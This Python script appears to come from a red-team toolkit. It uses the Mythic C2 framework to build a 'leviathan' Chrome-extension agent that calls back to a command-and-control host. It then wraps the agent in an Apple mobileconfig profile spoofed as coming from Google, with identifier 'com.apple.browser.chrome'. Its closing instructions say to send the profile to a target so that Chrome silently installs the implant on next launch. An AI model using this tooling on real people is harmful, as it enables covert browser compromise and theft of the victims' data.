import shutil, errno, os
from mythic import *
from sys import exit
import subprocess
from Settings.MythicSettings import *

def mobile_ext():
    temp = "./Templates/MobileConfigChrome/"
    payload = "./Payloads/MobileConfigChrome_Payload"    

    def copyanything(src, dst):
        try:
            shutil.copytree(src, dst)
            print("Copied Template Folder to '% s'" % payload)
        except OSError as error:
        	shutil.rmtree(dst)
        	shutil.copytree(src, dst)
        	print("Overwrote files '%s'" % payload)

    copyanything(temp,payload)    

    ## Create apfell payload
    async def scripting():
        mythic = Mythic(
            username=mythic_username,
            password=mythic_password,
            server_ip=mythic_server_ip,
            server_port=mythic_server_port,
            ssl=mythic_ssl,
            global_timeout=-1,
        )
        print("[+] Logging into Mythic")
        await mythic.login()
        await mythic.set_or_create_apitoken()
        # define what our payload should be
        p = Payload(
            # what payload type is it
            payload_type="leviathan", 
            # define non-default c2 profile variables
            c2_profiles={
                "leviathan-websocket":[
                        {"name": "callback_host", "value": mythic_ws_callback_host},
                        {"name": "callback_interval", "value": mythic_ws_callback_interval},
                        {"name": "callback_port", "value": mythic_ws_callback_port}
                    ]
                },
            # give our payload a description if we want
            # need to replace with prompt on where to host
            tag="Mobile_Config",
            build_parameters=[
            #{
                {"name": "update_url", "value": mythic_update_url},
                {"name": "url", "value": "http://www.google.com"},
                {"name": "version", "value": "1.0"}
           #}
           ],
            # if we want to only include specific commands, put them here:
            #commands=["cmd1", "cmd2", "cmd3"],
            # what do we want the payload to be called
            filename="Mobile_Config_Plugin.zip")
        print("[+] Creating new leviathan payload")
        # create the payload and include all commands
        # if we define commands in the payload definition, then remove the all_commands=True piece
        resp = await mythic.create_payload(p, all_commands=True, wait_for_build=True)
        print("[*] Downloading leviathan payload")
        # payload_contents is now the raw bytes of the payload
        payload_contents = await mythic.download_payload(resp.response)
        with open(payload + "/Mobile_Config_Plugin.zip", "wb") as f:
            f.write(payload_contents)  # write out to disk

        print("[*] Creating Mobile Payload")
        payloadDownloadid = resp.response.file_id.agent_file_id

        os.system("unzip " + payload + "/Mobile_Config_Plugin.zip -d " + payload + "/temp/")
        
        os.system("chmod +x " + payload + "/AppID.sh")
        subprocess.call(payload + "/AppID.sh")
        appID = subprocess.getoutput("cat " + payload + "/temp/AppIDValue")


        templateString1 = "PAYLOAD_ID"
        #templateString2 = "DISPLAY_NAME"
        templateString3 = "EXTENSION_APPID" 
        templateString4 = "UPDATE_URL"
        templateString5 = "PAYLOADORG"
        fin = open(payload + "/chrome.mobileconfig", "rt")
        data = fin.read()
        data = data.replace(templateString1, "com.apple.browser.chrome")
        #data = data.replace(templateString2, "Chrome Configuration")
        data = data.replace(templateString3, appID) # replaces wtih appID which looks like omaggmbmbjlbbhjjchidignmmdlmdhbo
        data = data.replace(templateString4, mythic_update_url)
        data = data.replace(templateString5, "Google")
        fin.close()
        fin = open(payload + "/chrome.mobileconfig", "wt")
        fin.write(data)
        fin.close()


        templateString6 = "EXT_URL"
        fin = open(payload + "/manifest.xml", "rt")
        data = fin.read()
        data = data.replace(templateString6, mythic_extension_file) 
        data = data.replace(templateString3, appID) 
        fin.close()
        fin = open(payload + "/manifest.xml", "wt")
        fin.write(data)
        fin.close()
   
        os.chdir(payload)
        os.system("zip -ur Mobile_Config_Plugin.zip manifest.xml")
        print("[+] Built Mobile_Config_Plugin.zip")
        print("To setup: \n"
              "1) Place the Mobile_Config_Plugin.zip on the update server and unzip. You want to host the files within the folder. \n"
              "2) Send the chrome.mobileconfig to the target \n"
              "3) After the target installs the profile on the next opening of Chrome the extension will download and install on target \n"
              "4) the IP will show loopback (127.0.0.1), this is expected behavior")
 



    async def main():
        await scripting()
        try:
            while True:
                pending = asyncio.Task.all_tasks()
                plist = []
                for p in pending:
                    if p._coro.__name__ != "main" and p._state == "PENDING":
                        plist.append(p)
                if len(plist) == 0:
                    exit(0)
                else:
                    await asyncio.gather(*plist)
        except KeyboardInterrupt:
            pending = asyncio.Task.all_tasks()
            for t in pending:
                t.cancel()    

    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())